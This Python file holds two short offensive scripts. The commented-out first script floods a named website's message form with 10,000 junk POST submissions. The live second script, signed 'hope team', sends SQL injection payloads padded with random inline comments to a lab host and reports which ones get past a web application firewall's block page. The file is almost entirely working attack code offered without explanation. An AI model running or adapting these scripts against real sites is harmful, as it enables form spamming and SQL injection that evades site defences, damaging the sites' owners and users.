# import requests
# import time
# import threading
#
# def main(th):
# 	time.sleep(0.1)
# 	for i in range(1, 10000):
# 		url = 'http://www.wellin123.com/index.php?_m=new_message_form&_a=savemes'
# 		data = {
# 			"msid": 18,
# 			"mes[text-i1]": "111",
# 			"mes[mobile-i2]": 11111111111,
# 			"mes[text-i3]": "ffff",
# 			"mes[text-i4]": 'tttt'
#
# 		}
# 		reponse = requests.post(url, data=data)
# 		print(th, i, reponse.status_code, reponse.text)
#
# # thread1 = threading.Thread(target=main('th1'),  args='th1')
# # thread1.start()
# # thread1.join()
#
# thread2 = threading.Thread(target=main('th2'),  args='th2')
#
# thread2.start()
# thread2.join()




# -*- coding:utf-8 -*-
# hope team

import random
import requests
import Queue
import threading

Q=Queue.Queue()

def string(x,y):
    seed = "1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ@$%^&*()_+=-"
    for i in range(x):
        sa=''.join([random.choice(seed) for x in range(y)])
        Q.put('http://192.168.67.129/sql.php?sql=1/*%s*/and/*%s*/1=1'% (sa,sa))

def fuzz():
    while not Q.empty():
        try:
            url=Q.get()
            r=requests.get(url=url).text
            if u'网站防火墙' not in r:
                print(u'[*] %s' % (url))
        except:
            pass

if __name__ == '__main__':
    string(1000,20)
    for i in range(20):
        t=threading.Thread(target=fuzz)
        t.start()